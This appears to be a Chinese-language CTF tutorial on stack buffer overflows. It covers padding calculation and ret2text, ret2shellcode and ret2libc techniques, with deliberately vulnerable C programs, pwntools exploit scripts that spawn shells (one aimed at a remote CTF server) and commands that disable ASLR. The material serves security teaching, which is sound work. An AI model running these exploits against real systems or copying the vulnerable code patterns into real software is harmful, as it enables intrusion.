![PWN-栈溢出入门](https://picx.zhimg.com/70/v2-cf51ab4867e228a86354820476339516_1440w.image?source=172ae18b&biz_tag=Post)

# PWN-栈溢出入门

[![雷石安全实验室](https://picx.zhimg.com/v2-03a29ac849e4781ceb80f617d515f78d_l.jpg?source=172ae18b)](https://www.zhihu.com/people/lei-shi-an-quan-shi-yan-shi)

[雷石安全实验室](https://www.zhihu.com/people/lei-shi-an-quan-shi-yan-shi)

向安全工作者不定期分享渗透、APT、企业安全建设等干货。

8 人赞同了该文章

**PWN-栈溢出入门**

**溢出padding计算**

**方法1：esp/ebp距离计算**

1. 溢出函数处下断点

b main

2. 记录esp、ebp

```text
EBP: 0xbffff508 --> 0x0 
ESP: 0xbffff480 --> 0x0
```

3. 找到溢出函数参数位置

```text
0x804858c <main+95>: lea    eax,[esp+0x1c]
```

4. padding = (ebp - (esp+1c)) + 4 = (0xbffff508 - 0xbffff480 - 0x1c ) +4 = 112

![](https://pic3.zhimg.com/80/v2-3957a1dc14adaf897089e1861f87d68e_720w.jpg)

![](https://pic4.zhimg.com/80/v2-1c855b166c6654065b64fd84f2616013_720w.webp)

**方法2：pattern_create**

通常情况下ebp + 4/rbp + 8更准确

```text
pattern_offset $ebp
pattern_offset $eip
pattern_offset $rbp
pattern_offset $rip
```

![](https://pic4.zhimg.com/80/v2-99befb389ad9ad48565c9392c6266a6f_720w.webp)

**方法3：cyclic**

```text
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# cyclic 200                                                                                                                                                                                                                     148 ⨯ 1 ⚙
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
                                                                                                                                                                                                                                             
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# gdb ret2shellcode                                                                                                                                                                                                                    1 ⚙
gdb-peda$ run
Starting program: /home/kali/Desktop/CTF/ret2shellcode 
No system for you this time !!!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
bye bye ~
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x9 ('\t')
EDX: 0xffffffff 
ESI: 0xb7fb0000 --> 0x1e4d6c 
EDI: 0xb7fb0000 --> 0x1e4d6c 
EBP: 0x62616163 ('caab')
ESP: 0xbffff510 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62616164 in ?? ()
gdb-peda$ 
zsh: suspended  gdb ret2shellcode
                                                                                                                                                                                                                                             
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# cyclic -l "0x62616164"                                                                                                                                                                                                         148 ⨯ 2 ⚙
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
112
```

![](https://pic2.zhimg.com/80/v2-84fac11b132fbeaf297ca2996c598159_720w.webp)

![](https://pic1.zhimg.com/80/v2-ebdf92ba78f27ea1c08581d4aa4ea4a4_720w.webp)

**栈溢出利用**

**ret2text**

ret2text 即控制程序执行程序本身已有的的代码(.text)

  

![](https://pic2.zhimg.com/80/v2-301342093ab29e5b87aa20717b113eb9_720w.webp)

**示例**

```text
// gcc -m32 -fno-stack-protector -no-pie ret2text.c -o ret2text
#include <stdio.h>
#include <string.h>

void success() { 
    puts("SUCCESS!!!");
    system("cat flag");
}

void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}

int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

.text段存在flag关键信息函数

![](https://pic2.zhimg.com/80/v2-6c55bb25e872631461c733167f77e4a5_720w.webp)

计算溢出长度

xxxxx

python代码

```text
from pwn import *

sh = process("./ret2text")
win = 0x8049182
sh.sendline(b'A'*24 + p32(win))
sh.interactive()
```

**ret2shellcode**

**图1**

![](https://pic3.zhimg.com/80/v2-1c38532ac0bb95b7133b6ea4e867f51a_720w.webp)

**图2**

![](https://pic2.zhimg.com/80/v2-11d787ac2c0f0f02f8ced16e10c15ae9_720w.webp)

**问题：如何确定shellcode起始地址**

关闭ASLR

```text
ASLR(系统开启的)

ASLR是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。

在linux中使用此技术后，杀死某程序后重新开启，地址换。

在windows中使用此技术后，杀死进程后重新开启，地址不换，重启才会改变。

 

以上cat命令输出的值表示：

0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。
```

echo 0 > /proc/sys/kernel/randomize_va_space

**echo 1 > /proc/sys/kernel/core_uses_pid**

**示例**

```text
#include <unistd.h>
void vuln_func()
{
        char buf[128];
        read(STDIN_FILENO,buf,256);
}

int main(void)
{
        vuln_func();
        write(STDOUT_FILENO,"hello world!\n",13);
}
```

1. 执行溢出确定溢出地址和core文件

为什么是$esp-140-4 因为此时的esp指向函数返回地址

函数是执行ret之后才报错的，所以此时代码已经执行完成ret，也就是说esp指向（返回地址 + 4）

```text
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 ⚙
Reading symbols from stack3...
(No debugging symbols found in stack3)
[New LWP 2936]
Core was generated by `./stack3'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xbf91afc0 in ?? ()
gdb-peda$ x/4wx $esp-140-4
0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389
gdb-peda$ 
zsh: suspended  gdb stack3 core.2936 -q
```

  

  

```text
#!/usr/bin/env python
from pwn import *

sh = process('./stack3')

# 方法1
shellcode = asm(shellcraft.sh())
buf2_addr = 0xbffff4c0
print(shellcode)
pause()
sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) ) 
sh.interactive()
```

方法2：

```text
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# gdb stack3 core.2961 -q                                                                                                                                                                                                             6 ⚙
Reading symbols from stack3...
(No debugging symbols found in stack3)
[New LWP 2961]
Core was generated by `./stack3'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xbf91afc0 in ?? ()
gdb-peda$ x/4wx $esp
0xbffff550:     0xbffff50a      0x00000000      0x00000000      0xb7de9e46
gdb-peda$ 



#!/usr/bin/env python
from pwn import *

sh = process('./stack3')
# 方法2
buf2_addr = 0xbffff550 # 就是esp的值
print(shellcode)
pause()
sh.sendline(b'b'*140+ p32(buf2_addr)  + shellcode) 
sh.interactive()
```

  

```text
┌──(root kali)-[/home/kali/Desktop/CTF]
└─# python3 stack3.py                                                                                                                                                                                                                   3 ⚙
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './stack3': pid 3037
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root),143(kaboxer)
$ 
[*] Interrupted
[*] Stopped process './stack3' (pid 3037)
```

**ret2libc**

![](https://pic3.zhimg.com/80/v2-f4f5bd6749e7d404542a9d6be448cb22_720w.webp)

**例1**

IDA分析

![](https://pic2.zhimg.com/80/v2-8d620bdfbeac59ae1846ddf6f9f8633d_720w.webp)

sh_addr = 0x08048720

![](https://pic2.zhimg.com/80/v2-9d6a3d122b2f8125194978209a5c57e5_720w.webp)

system_addr = 0x08048460

![](https://pic4.zhimg.com/80/v2-741d5ef9a4423f565eedc0e385954957_720w.webp)

padding = 112

![](https://pic4.zhimg.com/80/v2-c341da20137022956850edb879fc7c9b_720w.webp)

exp

```text
from pwn import *

sh = process("./ret2libc1")

binsh = 0x08048720

system_plt = 0x08048460

whatever_addr = 0x11111111

payload = b"a" * 112
payload += p32(system_plt)
payload += p32(whatever_addr)# 这里就是调用system的返回地址，没有实际意义
payload += p32(binsh)

sh.sendline(payload)

sh.interactive()
```

![](https://pic2.zhimg.com/80/v2-752c4f7160441d7100a97aeb72395b39_720w.webp)

**例2**

checksec

xxxxx

计算padding = 112

![](https://pic1.zhimg.com/80/v2-cdb726c118ac609adbdff6d664abe2e8_720w.webp)

.bss buf2 = 0x0804A080

![](https://pic4.zhimg.com/80/v2-945106e76f064409b3d5cdeef981d0e3_720w.webp)

gets = 08048460

![](https://pic3.zhimg.com/80/v2-77559c6875a5e6f14ddc150ac8c76a7e_720w.webp)

system = 08048490

![](https://pic3.zhimg.com/80/v2-ab417e7a31aae2a260850870ac51172a_720w.webp)

栈情况分析

![](https://pic1.zhimg.com/80/v2-fdbc6ce2b5d4db29d17e44f2885f9450_720w.webp)

exp

```text
from pwn import *

sh = process("./ret2libc2")

get_addr = 0x08048460
buf_addr = 0x0804A080
system_addr = 0x08048490

payload = b"Q" * 112
payload += p32(get_addr)
payload += p32(system_addr)
payload += p32(buf_addr)
payload += p32(buf_addr)

sh.sendline(payload)
sh.sendline("/bin/sh")

sh.interactive()
```

exp2

```text
from pwn import *

sh = process("./ret2libc2")
elf = ELF("./ret2libc2")

get_addr = elf.plt['gets']
system_addr = elf.plt['system']
buf_addr = elf.symbols['buf2']

payload = b"Q" * 112
payload += p32(get_addr)
payload += p32(system_addr)
payload += p32(buf_addr)
payload += p32(buf_addr)

sh.sendline(payload)
sh.sendline("/bin/sh")

sh.interactive()
```

![](https://pic4.zhimg.com/80/v2-8f6a86cfcadb29d784dc6c9f3594c1fb_720w.webp)

**例3**

函数基址 base = A函数got - A函数libc = B函数got - B函数libc

xctf level3

![](https://pic1.zhimg.com/80/v2-fde412d5005a9d7d63148901731d2668_720w.webp)

libc_write = 0x000D43C0

![](https://pic1.zhimg.com/80/v2-aa46d1c9f546b80bce55a426386111c4_720w.webp)

libc_system = 0x0003A940

![](https://pic1.zhimg.com/80/v2-f86d4f664d03e16eb9e37887f4074f58_720w.webp)

libc_bin = 0x0015902B

![](https://pic3.zhimg.com/80/v2-1963273d1961a52f9d86892dfa750842_720w.webp)

```text
1.from pwn import *  
2.   
3.p=remote('111.200.241.244',65388)  
4.elf=ELF('./level3')  
5.libc = ELF('./libc_32.so.6')  
6.   
7.write_plt=elf.plt['write']  
8.write_got=elf.got['write']  
9.main_addr=elf.sym['main']  
10.   
11.p.recvuntil(":\n")  
12.payload1=b'A'*(0x88+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)  
13.p.sendline(payload1)  
14.   
15.write_got_addr=u32(p.recv())  
16.   
17.libc_write = 0x000D43C0  
18.libc_system = 0x0003A940  
19.libc_bin = 0x0015902B  
20.   
21.# libc_base=write_got_addr-libc.sym['write']  
22.libc_base=write_got_addr-libc_write  
23.system_addr = libc_base+libc_system  
24.# system_addr = libc_base+libc.sym['system']  
25.   
26.bin_sh_addr = libc_base + 0x15902b  
27.payload2=b'A'*(0x88+4)+p32(system_addr)+p32(0x12341234)+p32(bin_sh_addr)  
28.p.recvuntil(":\n")  
29.p.sendline(payload2)  
30.p.interactive()
```